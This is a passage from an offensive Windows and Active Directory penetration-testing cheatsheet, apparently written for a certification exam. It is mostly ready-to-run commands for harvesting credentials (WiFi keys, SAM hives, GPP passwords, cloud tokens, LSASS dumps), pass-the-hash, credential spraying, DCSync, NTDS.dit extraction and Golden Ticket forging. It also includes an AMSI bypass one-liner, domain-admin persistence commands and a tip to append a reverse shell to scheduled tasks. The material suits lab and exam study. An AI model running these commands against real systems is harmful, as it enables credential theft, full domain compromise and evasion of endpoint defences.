  • Creds from WiFi
    • PSK is retrievable in cleartext with netsh wlan show profile <SSID> key=clear — often reused elsewhere.
netsh wlan show profile
netsh wlan show profile <SSID> key=clear
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
  • Creds from sticky notes app
    • Notes stored in an SQLite database — copy and inspect on your attacker machine.
c:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
  • Creds stored in services
    • SessionGopher extracts saved session credentials from PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP in one pass.
# https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm\-arvanaghi -p s3cr3tP@ss
  • Creds from Powershell History
    • Passwords passed as inline arguments appear in plaintext. Check all user profiles with C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt.
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
  • Creds from alternate data stream
    • NTFS ADS can hide data attached to a visible file. Detect with dir /R; read with more < secret.txt:hidden.
Get-Item -path <filename> -Stream *
Get-Content -path <filename> -Stream <keyword>
  • SAM & SYSTEM bak
    • Backup copies in repair\ and RegBack\ may be readable when live hives are locked; use with secretsdump.py offline.
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
  • Cloud credentials
    • AWS, GCP, and Azure CLI cache tokens in user profile directories; high-privilege AWS keys may allow sts:AssumeRole escalation; Azure tokens may unlock Key Vault secrets.
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
  • Cached GPP password
    • GPP XML files in SYSVOL use a static AES key (published by Microsoft); gpp-decrypt recovers the plaintext instantly. Remote: crackmapexec smb [target] -u [user] -p [pass] -M gpp_password.
# Before Vista
C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history
# After Vista
C:\ProgramData\Microsoft\Group Policy\history
# Look for: Groups.xml, Services.xml, Scheduledtasks.xml, DataSources.xml, Printers.xml, Drives.xml

gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
  • Saved RDP connections
    • Registry records recently connected RDP hosts; saved credentials may be replayable with runas /savecred.
HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\
HKCU\Software\Microsoft\Terminal Server Client\Servers\
  • Remote desktop credential manager
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
  • SCClient \ SCCM
    • SCCM deploys software as SYSTEM; if the retrieved application is vulnerable to DLL sideloading, it provides a SYSTEM escalation path.
# https://github.com/enjoiz/Privesc
$result = Get-WmiObject -Namespace "root\\ccm\\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
  • Check Recycle Bin
    • Users sometimes delete files containing credentials; restore and inspect deleted docs, scripts, and config files.
    • List via PowerShell: (New-Object -ComObject Shell.Application).NameSpace(0xa).Items() | Select-Object Name,Path

22.4 Active Directory

Attack chain: External → Internal → Domain Controller. Each stage feeds the next — hashes from the external box reuse on internal, domain accounts on internal may have DCSync rights.

Kill-Chain Stage Goal Key Actions / Tools What Success Looks Like
External Recon Map exposed services and gather initial credentials nmap, enum4linux-ng, net view, browser/app login, share browsing At least one username + password or NTLM hash; network interface list revealing internal subnets
Initial Access (External foothold) Gain code execution on the perimeter machine Exploit public-facing service, web app, or VPN; phishing in real engagements Interactive shell or WinRM / SMB session on external box as any user
Internal Enumeration Understand the AD environment, users, groups, trusts, and attack paths SharpHound + BloodHound, ldapdomaindump, crackmapexec --users, SYSVOL browse BloodHound graph loaded; shortest path to Domain Admins identified; Kerberoastable / AS-REP-roastable accounts listed
Privilege Escalation Move from low-privilege user to local admin or domain-privileged account Service misconfig (accesschk.exe), scheduled-task hijack, GPP/cpassword (gpp-decrypt), token impersonation, Kerberoasting (impacket-GetUserSPNs) Local SYSTEM or domain account with elevated rights; SAM hashes in hand
Lateral Movement Reach the internal machine(s) using harvested credentials or hashes evil-winrm -H, impacket-psexec, impacket-wmiexec, xfreerdp, crackmapexec spray Shell on internal machine; new credential set available for the next hop
DC / Domain Dominance Compromise the Domain Controller and extract all domain hashes mimikatz lsadump::dcsync, impacket-secretsdump against NTDS.dit, Golden Ticket (kerberos::golden), LSASS dump krbtgt hash + Administrator NT hash in hand; proof.txt captured from DC desktop

22.4.1 External Machine

Map your identity, network interfaces, and any plaintext credentials before attempting any exploit.

  • Identify the machine name and all network interfaces — multiple adapters indicate a pivot target into the internal network.
    • systeminfo | findstr /i "domain" confirms domain membership immediately.
    • route print reveals internal subnets not yet in scope.
  • Enumerate local accounts; svc_* accounts often run services with elevated privileges and weak passwords.
  • Check accessible network shares for deployment scripts, config backups, and embedded credentials.
    • A writable share can stage a payload triggered via a scheduled task or service.
hostname
ipconfig /all
systeminfo | findstr /i "domain"
route print
net user
net view \\[external_machine_ip]
  • (Technique 1) Service Misconfigurations — services running as SYSTEM with a writable binary path let you replace the executable; the next restart runs your payload as SYSTEM.
    • Use accesschk.exe to find services where Authenticated Users has write on the binary path.
    • Unquoted paths: C:\Program Files\My App\service.exe without quotes tries C:\Program.exe first — place a payload there if the directory is writable.
sc query state= all | findstr "SERVICE_NAME"
accesschk.exe -wuvc *
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """"
Technique Precondition Key Tool / Command What Confirms It
Service binary replacement Write access to service binary or its directory accesschk.exe -wuvc * RW on binary path for low-priv account
Unquoted service path Space in path, writable intermediate directory wmic service get name,pathname Path without quotes containing a space; write on parent dir
Password hunting (config files) Low-privilege read access to file system findstr /si password *.config *.xml *.txt Plaintext password= or pwd= string in output
SAM/SYSTEM dump Local admin or SYSTEM reg save HKLM\SAM + impacket-secretsdump NT hash lines in secretsdump output
Scheduled task hijack Write access to task binary or script schtasks /query /fo LIST /v Non-\Microsoft task running as SYSTEM with writable path
  • (Technique 2) Password Hunting — search C:\ProgramData, C:\Users\All Users, and application folders for cleartext passwords; try pass, pwd, secret, key, and token in addition to password.
    • Registry: reg query HKLM /f password /t REG_SZ /s and reg query HKCU /f password /t REG_SZ /s.
    • PowerShell history: type C:\Users\[user]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt.
dir /s /b C:\Users\Public\*.config
findstr /si password C:\ProgramData\*.config C:\ProgramData\*.xml C:\ProgramData\*.txt
  • (Technique 3) Dumping SAM Database — save the SAM and SYSTEM hives with reg save (the live file cannot be copied directly), then extract hashes offline; use the NT hashes for Pass-the-Hash against the internal machine.
    • If reg save is blocked, access SAM through a VSS snapshot: vssadmin list shadows, then copy from the shadow path.
# Run on Windows target
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
# Run on Kali
impacket-secretsdump -sam sam.save -system system.save LOCAL
  • (Technique 4) Try Harder / Think Outside the Box — relax, take a 5-minute break, and remember: the machine is designed to be vulnerable. Use all the other resources from this cheatsheet — Section 7 (Windows Privilege Escalation), Sections 11–14 (Active Directory), and Section 19.3.2 (Methodology for Windows Privilege Escalation). Don't give up, you've come a long way to be here, with God's help you got this.

22.4.2 Internal Machine

Try every credential gathered externally against every available protocol — password reuse is the most common bridge between machines.

Tool / Method Protocol / Port Auth Type Supported When to Use Noise / OPSEC Note
evil-winrm WinRM / 5985 (HTTP), 5986 (HTTPS) Plaintext, NT hash (-H) Target is in Remote Management Users; preferred for interactive work Low — uses standard WS-Management; less flagged than SMB exec
impacket-psexec SMB / 445 Plaintext, NT hash (-hashes) Need SYSTEM shell quickly; target has open SMB and admin share High — drops a service binary; triggers Windows Event 7045
impacket-wmiexec WMI / 135 + dynamic RPC Plaintext, NT hash (-hashes) SMB exec blocked or noisy; want semi-interactive shell without dropping files Medium — no service install; still generates WMI process creation events
xfreerdp RDP / 3389 Plaintext, Pass-the-Hash (restricted admin mode) GUI needed; mounting local drives for file transfer; user in Remote Desktop Users Medium — graphical session creates logon event 4624 type 10
crackmapexec smb spray SMB / 445 Plaintext, NT hash Testing many credentials at once across a subnet; confirming access before using exec tool High — many failed auths trigger account lockout and Event 4625 storms
  • Pass-the-Hash (PtH) — NTLM never requires the plaintext; a captured NT hash is sufficient to authenticate against SMB, WinRM, and any other NTLM-speaking service.
    • Impacket expects LM:NT format; use aad3b435b51404eeaad3b435b51404ee:[NT_hash] when you only have the NT portion.
    • Local Administrator RID 500 PtH is more reliable than standard user PtH due to UAC remote restrictions.
    • Confirm with crackmapexec smb [ip] -u [user] -H [hash] before opening a full shell.
evil-winrm -i [target_ip] -u [username] -H aad3b435b51404eeaad3b435b51404ee:[NTLM_hash]
impacket-psexec [username]@[target_ip] -hashes aad3b435b51404eeaad3b435b51404ee:[NTLM_hash]
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:[NTLM_hash] [username]@[target_ip]
  • Credentials Reuse — test every plaintext credential against all available protocols; specify -d [domain] for domain accounts and --local-auth for local accounts.
    • Spray the credential across the whole internal subnet: crackmapexec smb [subnet]/24 -u [user] -p [password] --continue-on-success.
xfreerdp /size:1920x1080 /u:[user] /p:[password] /v:[host_ip] /drive:desktop,/home/[your_username]/Desktop
evil-winrm -u [username] -p [password] -i [target_ip]
impacket-psexec [username]:[password]@[target_ip]
impacket-wmiexec [username]:[password]@[target_ip]
  • (Technique 1) Group Policy Preferences (GPP) Abuse — Microsoft published the AES key used to encrypt cpassword values in SYSVOL (MS14-025); any domain user can read SYSVOL and decrypt them with gpp-decrypt.
    • Look for Groups.xml, Services.xml, Scheduledtasks.xml, and DataSources.xml in the SYSVOL Policies tree.
    • From Kali: crackmapexec smb [dc_ip] -u [user] -p [pass] -M gpp_password scans and decrypts automatically.
dir \\[domain]\SYSVOL\[domain]\Policies\ /s /b | findstr cpassword
crackmapexec smb [dc_ip] -u [user] -p [pass] -M gpp_password
impacket-smbclient [domain]/[user]:[pass]@[dc_ip]
  • (Technique 2) BloodHound Analysis — SharpHound collects AD object relationships; BloodHound's graph finds attack paths that would take hours manually.
    • Key queries: Shortest Path to Domain Admins, List All Kerberoastable Accounts, Find AS-REP Roastable Users.
    • ACL edges: GenericAll on a user → reset password; GenericAll on a group → add yourself; WriteDACL on the domain → grant DCSync rights.
    • Kerberoasting: impacket-GetUserSPNs -dc-ip [dc] [domain]/[user]:[pass] -request, then crack with hashcat -m 13100.
    • Use -c DCOnly or the Python bloodhound-python collector from Kali for quieter collection.
.\SharpHound.exe -c All -d [domain] -u [username] -p [password] -f AllData
# From Kali
bloodhound-python -u [user] -p [pass] -d [domain] -ns [dc_ip] -c All
  • (Technique 3) Scheduled Task and Service Exploitation — tasks not under \Microsoft often run as SYSTEM with a writable binary or script path; replace or append to gain execution at the next scheduled run.
    • Script-based tasks (.ps1, .bat): append a reverse-shell line rather than replacing the whole script to avoid breaking the legitimate function.
schtasks /query /fo LIST /v
  • (Technique 4) Enumerate Internal Subdomains — spray every credential and hash against any discovered subdomain before looking for new exploits; cross-domain credential reuse is extremely common on exam AD sets.
    • Trust enumeration: nltest /domain_trusts or BloodHound's Map Domain Trusts; a two-way trust means your account can authenticate to objects in the trusted domain.
    • Check for sIDHistory attributes containing high-value SIDs from the trusted domain.
crackmapexec winrm [domain_ip] -u [user_list].txt -p [found_passwords].txt --continue-on-success -d [subdomain.domain.com]
crackmapexec winrm [domain_ip] -u [user_list].txt -H [found_ntlm_hashes].txt --continue-on-success -d [subdomain.domain.com]
crackmapexec smb [ip] -u [user_list].txt -p [found_passwords].txt -d [subdomain.domain.com] --continue-on-success
crackmapexec smb [ip] -u [user_list].txt -H [found_ntlm_hashes].txt -d [subdomain.domain.com] --continue-on-success
impacket-smbclient [user]:[password]@[ip]
impacket-smbclient [user]@[ip] -hashes aad3b435b51404eeaad3b435b51404ee:[valid_ntlm_hash]
  • (Technique 5) Try Harder / Think Outside the Box — relax, take a 5-minute break, and remember: the machine is designed to be vulnerable. Use all the other resources from this cheatsheet — Section 7 (Windows Privilege Escalation), Sections 11–14 (Active Directory), and Section 19.3.2 (Methodology for Windows Privilege Escalation). Don't give up, you've come a long way to be here, with God's help you got this.

22.4.3 Domain Controller

You need either a domain admin account, a user with Replicating Directory Changes privileges, or SYSTEM on a machine holding cached domain admin credentials. DCSync can be performed remotely — no interactive shell on the DC required.

Method Precondition Tool / Command Artifacts / Noise What You Get
DCSync Domain Admin or DS-Replication-Get-Changes(-All) rights mimikatz lsadump::dcsync /domain:X /user:Y Event ID 4662 (replication); no file written to DC Any account's NT hash on demand; krbtgt + Administrator
NTDS.dit extraction (VSS) SYSTEM on DC vssadmin create shadow + copy + impacket-secretsdump LOCAL VSS snapshot creation logged; large file exfil All domain hashes offline; historical password history
LSASS dump Local admin or SYSTEM on any machine with DA session mimikatz sekurlsa::logonPasswords or comsvcs.dll MiniDump LSASS access triggers Event 4656; AV alerts on Mimikatz binary Cleartext creds (if WDigest on) + NT hashes + Kerberos tickets in memory
Golden Ticket krbtgt NT hash + domain SID mimikatz kerberos::golden /krbtgt:[hash] /user:Administrator Forged TGT with abnormal lifetime flagged by advanced SIEM Impersonate any domain account indefinitely; survives password resets
Pass-the-Hash to DC Domain Administrator NT hash impacket-psexec Administrator@dc-ip -hashes :[NT_hash] Service binary drop (Event 7045); SMB authentication event 4624 SYSTEM shell on DC; access to NTDS.dit and all flags
  • (Technique 1) DCSync Attack — Mimikatz impersonates a DC and requests credential replication via MS-DRSR; always dump krbtgt and Administrator hashes in one pass.
    • From Kali: impacket-secretsdump [domain]/[user]:[pass]@[dc_ip] — use -just-dc-user krbtgt to limit scope.
    • If you have WriteDACL on the domain object (visible in BloodHound), grant yourself DCSync rights with PowerView's Add-ObjectACL before running DCSync — no DA required.
mimikatz # lsadump::dcsync /domain:[domain] /user:[target_user]
impacket-secretsdump [domain]/[user]:[pass]@[dc_ip]
impacket-secretsdump [domain]/[user]:[pass]@[dc_ip] -just-dc-user krbtgt
  • (Technique 2) Dumping the NTDS.dit Database — NTDS.dit is locked at runtime; always access it via a VSS shadow copy, then extract offline with impacket-secretsdump alongside the SYSTEM hive. See Sections 7.11.3 and 13.10 for detailed steps.
    • Pass -just-dc-ntlm to limit output to NT hashes only for faster grepping.
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
  • (Technique 3) Golden Ticket Attack — the krbtgt hash lets you forge a TGT for any user with any group memberships, valid for up to 10 years; primarily useful for persistence after you already hold DA. See Section 13.4 for a detailed guide.
    • Required: domain FQDN, domain SID (whoami /user minus the last RID), krbtgt NT hash, and the username to impersonate.
    • Invalidated only by resetting the krbtgt password twice.
mimikatz # kerberos::golden /domain:[domain] /sid:[domain_SID] /krbtgt:[NTLM_hash] /user:Administrator
  • (Technique 4) Credential Harvesting via LSASS — LSASS caches NT hashes, Kerberos tickets, and (if WDigest is enabled) cleartext credentials for recently authenticated users; on the DC it almost always holds domain admin material. See Section 6.12 for full Mimikatz commands.
    • Use comsvcs.dll MiniDump to avoid dropping the Mimikatz binary: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [lsass_pid] C:\Temp\lsass.dmp full, then parse on Kali with pypykatz lsa minidump lsass.dmp.
    • WDigest is off by default on Windows 8.1+ / Server 2012 R2+; focus on NT hashes for modern targets.
mimikatz # sekurlsa::logonPasswords
pypykatz lsa minidump lsass.dmp

22.4.4 Post-Exploitation and Flag Collection

Run the proof one-liner immediately after gaining access, before anything else changes the session state.

  • Flags are usually at C:\Users\Public or C:\Users\[Administrator/any_user]\Desktop — check every machine.
    • Recursive search: dir /s /b local.txt proof.txt.
    • Without a shell: impacket-smbclient [admin]@[ip] -hashes :[hash] to browse and get flag files directly.
  • Each proof screenshot must show the machine hostname, current user, IP address, and flag contents — taken from an interactive shell (no web shells).
hostname && whoami && ipconfig /all && type [local/proof].txt
# Persistence (only if rules of engagement allow)
net user new_admin [password] /add /domain
net group "Domain Admins" new_admin /add /domain

22.4.5 Additional Tips for Efficiency and Stealth

  • Use Stealthy Enumeration Tools — Invoke-Obfuscation can obfuscate PowerShell scripts to bypass detection.
    • AMSI bypass before loading unsigned scripts: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true).
    • Prefer Windows built-ins (certutil, wmic, rundll32, netsh) over custom binaries — fewer AV detections and a cleaner report trail.
  • Document EVERYTHING — save all commands, paths, flags, screenshots, and credentials for accurate reporting.
    • Run script -a /tmp/exam_log_$(date +%F).txt at the start of each terminal session to capture every command and output automatically.
  • Alternative Login Techniques — if RDP or WinRM fails, try SMBexec, CrackMapExec, or Evil-WinRM as fallbacks.
    • If WinRM on the internal machine is unreachable from Kali, port-forward through the external machine: ssh -L 5985:[internal_ip]:5985 [user]@[external_ip], or use chisel / plink for a reverse tunnel.
